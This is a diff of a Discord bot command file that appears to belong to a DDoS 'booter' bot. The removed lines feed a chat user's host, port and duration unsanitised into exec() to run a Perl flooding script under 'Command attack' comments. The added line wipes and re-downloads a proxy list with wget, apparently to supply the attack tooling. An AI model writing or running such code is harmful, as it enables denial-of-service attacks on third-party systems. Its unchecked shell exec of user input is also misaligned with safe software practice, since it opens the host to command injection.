@@ -2,9 +2,6 @@ const Discord = require("discord.js");
 
 exports.run = async (client, message, args) => {
 
-const host = message.content.split (" ")[1]
-const port = message.content.split (" ")[2]
-const duration = message.content.split (" ")[3]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -25,7 +22,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`perl home.pl ${host} ${port} 65500 ${duration}`, (error, stdout, stderr) => {
+exec(`rm proxy.txt && wget https://raw.githubusercontent.com/apaple/Proxy/main/proxy.txt`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -70,12 +67,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['home'],
+  aliases: ['scrape'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'home',
+  name: 'scrape',
   description: 'zxcr9999',
-  usage: 'home'
+  usage: 'scrape'
 }
